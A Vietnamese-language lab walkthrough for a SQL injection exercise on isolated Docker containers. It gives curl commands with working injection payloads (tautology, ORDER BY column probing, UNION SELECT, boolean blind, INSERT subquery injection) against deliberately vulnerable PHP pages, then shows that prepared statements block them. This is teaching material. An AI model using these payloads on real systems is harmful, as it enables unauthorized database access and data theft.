# HƯỚNG DẪN THỰC HÀNH VÀ DEMO LAB 05 – SQL INJECTION

## 1. Kết nối SSH từ máy Windows lên Ubuntu Server
```bash
ssh orias@192.168.117.13
```

## 2. Di chuyển vào thư mục bài Lab trên Server
```bash
cd /media/sf_.shared/scripts/lab05
```

## 3. Chạy tự động qua các script trong thư mục `.lab`:
```bash
bash .lab/00_init.sh
bash .lab/01_example1_select.sh
bash .lab/02_example2_insert.sh
bash .lab/03_test_defense.sh
# Kết thúc demo Lab 05, giải phóng subnet:
bash .lab/99_down.sh
```

*(Hoặc chạy trực tiếp từ bất kỳ đâu bằng đường dẫn tuyệt đối):*
```bash
bash /media/sf_.shared/scripts/lab05/.lab/00_init.sh
bash /media/sf_.shared/scripts/lab05/.lab/01_example1_select.sh
bash /media/sf_.shared/scripts/lab05/.lab/02_example2_insert.sh
bash /media/sf_.shared/scripts/lab05/.lab/03_test_defense.sh
bash /media/sf_.shared/scripts/lab05/.lab/99_down.sh
```

---

## GIAI ĐOẠN 0: DỰNG MÔI TRƯỜNG WEB & DATABASE

Hệ thống được ảo hóa gồm 3 container kết nối trên cùng mạng bridge `net-10.2.6.0` (Subnet: `10.2.6.0/24`):

- `lab05_webserver`: IP `10.2.6.80` (Apache2, PHP, MariaDB/MySQL với DB `webvul`)
- `lab05_attacker`: IP `10.2.6.51` (Client kiểm thử)
- `lab05_user`: IP `10.2.6.10` (Người dùng thông thường)

```bash
cd /media/sf_.shared/scripts/lab05
sudo docker compose up -d
sudo docker ps
```

Kiểm tra trang web từ trình duyệt hoặc curl:

```bash
curl -I http://10.2.6.80/sqli/sqli1.html
curl -I http://10.2.6.80/sqli/sqli2.html
```

---

## GIAI ĐOẠN 1: VÍ DỤ 1 – KIỂM THỬ SELECT SQL INJECTION (`sqli1.php`)

### Bước 1: Truy vấn bình thường

```bash
curl -s "http://10.2.6.80/sqli/sqli1.php?cat=laptop"
```

### Bước 2: Thử dấu nháy đơn (`'`) gây lỗi cú pháp CSDL

```bash
curl -s "http://10.2.6.80/sqli/sqli1.php?cat=laptop'"
```

*(Thông báo lỗi từ MySQL xác nhận có lỗ hổng SQLi).*

### Bước 3: Thêm ký tự chú thích (`#` -> `%23`) khôi phục cú pháp

```bash
curl -s "http://10.2.6.80/sqli/sqli1.php?cat=laptop';%23"
```

### Bước 4: Khai thác Tautology (`any' or 1;#`)

```bash
curl -s "http://10.2.6.80/sqli/sqli1.php?cat=any'+or+1;%23"
```

*(Hiển thị toàn bộ danh sách sản phẩm trong bảng).*

### Bước 5: Dò số lượng cột bằng `ORDER BY`

```bash
# Thử 4 cột (Thành công):
curl -s "http://10.2.6.80/sqli/sqli1.php?cat=laptop'+ORDER+BY+4;%23"
# Thử 5 cột (Báo lỗi Unknown column 5 -> xác nhận bảng có đúng 4 cột):
curl -s "http://10.2.6.80/sqli/sqli1.php?cat=laptop'+ORDER+BY+5;%23"
```

### Bước 6: Trích xuất tên CSDL bằng `UNION SELECT`

```bash
curl -s "http://10.2.6.80/sqli/sqli1.php?cat=laptop'+UNION+SELECT+1,database(),3,4;%23"
```

*(Tên CSDL `webvul` được in ra tại vị trí cột Vendor).*

### Bước 7: Kiểm thử Boolean-based Blind SQL Injection

```bash
# Đoán ký tự đầu là 'w' (Đúng -> Có sản phẩm):
curl -s "http://10.2.6.80/sqli/sqli1.php?cat=laptop'+and+substring(database(),1,1)='w';%23"
# Đoán ký tự đầu là 'a' (Sai -> Trang rỗng):
curl -s "http://10.2.6.80/sqli/sqli1.php?cat=laptop'+and+substring(database(),1,1)='a';%23"
```

---

## GIAI ĐOẠN 2: VÍ DỤ 2 – KIỂM THỬ INSERT SQL INJECTION (`sqli2.php`)

### Bước 8: Gửi dữ liệu POST bình thường

```bash
curl -s -X POST -d "cat=keyboard&vendor=Logitech&model=K120&price=10" http://10.2.6.80/sqli/sqli2.php
```

### Bước 9: Dò lỗ hổng trên tham số `vendor`

```bash
curl -s -X POST -d "cat=keyboard&vendor=anyVendor'&model=Test&price=5" http://10.2.6.80/sqli/sqli2.php
```

### Bước 10: Cân bằng số cột và đóng mệnh đề VALUES

```bash
curl -s -X POST -d "cat=keyboard&vendor=anyVendor', '1', '2', '3');#&model=anyModel&price=0" http://10.2.6.80/sqli/sqli2.php
```

*(Bản ghi mới xuất hiện trên bảng danh sách).*

### Bước 11: Trích xuất tên CSDL qua lệnh INSERT

```bash
curl -s -X POST -d "cat=keyboard&vendor=anyVendor', database(), '2', '3');#&model=anyModel&price=0" http://10.2.6.80/sqli/sqli2.php
```

*(Trường Model trong bảng hiển thị giá trị `webvul`).*

### Bước 12: Khai thác Subquery lấy phiên bản MySQL

```bash
curl -s -X POST -d "cat=keyboard&vendor=anyVendor', (select version()), '2', '3');#&model=anyModel&price=0" http://10.2.6.80/sqli/sqli2.php
```

---

## GIAI ĐOẠN 3: KIỂM CHỨNG KHẮC PHỤC (PREPARED STATEMENTS)

### Bước 13: Thử nghiệm lại trên `sqli1_fixed.php`

```bash
curl -s "http://10.2.6.80/sqli/sqli1_fixed.php?cat=any'+or+1;%23"
curl -s "http://10.2.6.80/sqli/sqli1_fixed.php?cat=laptop'+UNION+SELECT+1,database(),3,4;%23"
```

*(Prepared Statement coi payload là chuỗi giá trị thô, hoàn toàn không bị SQLi).*

### Bước 14: Thử nghiệm lại trên `sqli2_fixed.php`

```bash
curl -s -X POST -d "cat=keyboard&vendor=anyVendor', database(), '2', '3');#&model=anyModel&price=0" http://10.2.6.80/sqli/sqli2_fixed.php
```

*(Dữ liệu được lưu nguyên văn dưới dạng text thuần, hàm `database()` không bị thực thi).*
